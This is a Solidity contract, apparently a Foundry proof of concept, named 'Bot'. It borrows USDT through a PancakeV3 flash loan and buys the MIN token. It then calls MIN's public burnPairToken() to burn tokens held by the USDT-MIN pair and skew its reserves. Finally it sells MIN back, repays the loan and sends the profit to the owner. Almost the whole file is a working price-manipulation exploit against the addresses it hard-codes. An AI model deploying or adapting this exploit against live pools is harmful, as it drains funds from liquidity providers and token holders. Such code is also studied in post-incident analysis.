//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

interface IMIN is IERC20 {
    function burnPairToken() external;
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions public USDT_WBNB_POOL = IUniswapV3PoolActions(0x172fcD41E0913e95784454622d1c3724f546f849);

    IUniswapV2Router public constant uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair public constant USDT_MIN_PAIR = IUniswapV2Pair(0xE691e7f027830F832F77345B9bb3b603811385f1);

    ERC20 public constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    IMIN public constant MIN = IMIN(0x90F7a75aFc82f1E86C37e72Ac6E572A8823Dc067);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(uniswapRouter), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(uniswapRouter), 0);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        uint256 borrowAmount = abi.decode(data, (uint256));

        console.log("Before buy");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(MIN), USDT.balanceOf(address(this)), address(this)
        );

        console.log("After buy");
        console.log("Before burn");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        console.log();

        MIN.burnPairToken();

        console.log("After burn");
        console.log("Before sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(MIN), address(USDT), MIN.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        console.log();

        require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    function main(uint256 flashLoanAmount, address withdrawAddress) public onlyOwner {
        flashLoanAmount = flashLoanAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount);

        USDT_WBNB_POOL.flash(address(this), flashLoanAmount, 0, params);

        USDT.transfer(withdrawAddress, USDT.balanceOf(address(this)));

        console.log("Profit =>", (USDT.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }
}
